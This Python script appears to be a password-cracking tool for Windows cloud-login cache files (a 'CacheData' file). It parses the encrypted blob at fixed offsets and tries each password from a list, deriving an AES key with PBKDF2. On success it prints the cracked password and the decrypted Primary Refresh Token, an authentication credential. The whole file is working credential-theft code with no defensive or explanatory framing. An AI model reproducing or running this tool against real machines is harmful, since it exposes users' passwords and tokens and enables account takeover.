import json
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes

def bruteforce(arguments):
    file_path = arguments.CacheData
    with open(file_path, 'rb') as file:
        Data = bytearray(file.read())
    p = 0x60
    enc_data_size = int.from_bytes(Data[p:p + 4], byteorder='little')
    p += 4
    if arguments.verbose:
        print(f"Encrypted data size: {enc_data_size}.")
    while True:
        enc_key_size = int.from_bytes(Data[p:p + 4], byteorder='little')
        p += 4
        if arguments.verbose:
            print("enc_key_size", enc_key_size)
            print("p", p)
        if enc_key_size == 0x30:
             if int.from_bytes(Data[p + 0x30:p + 0x34], byteorder='little') == enc_data_size:
                i = p + enc_data_size
                if arguments.verbose:
                    print(i)
                break
    enc_data = Data[p + 4 + 0x30:p + 4 + 0x30 + enc_data_size]
    for password in arguments.passwords:
        if arguments.verbose:
            print("Trying : " + password + "\n") 
        password_array = password.encode('utf-16-le')
        secret = get_pbkdf2(password_array)
        if arguments.verbose:
            print(secret)
        default_iv = b'\x00' * 16
        decrypted_data = aes_decrypt(enc_data,secret,default_iv)
        header_decrypted = decrypted_data[0:0x20]
        key_decrypted = decrypted_data[0x20:0x70]
        decrypted_prt = decrypted_data[0x70:]
        if decrypted_prt.startswith(b'{"Version"'):
            print(f"\n[+] Password: '{password}'")
            print("[+] PRT:")
            prt_dict = json.loads(decrypted_prt)
            print(json.dumps(prt_dict, indent=4))
            break


def get_pbkdf2(password, salt=b'', iterations=10000):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=iterations,
        backend=default_backend()
    )
    key = kdf.derive(password)
    return key


def aes_decrypt(encrypted_data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    return decrypted_data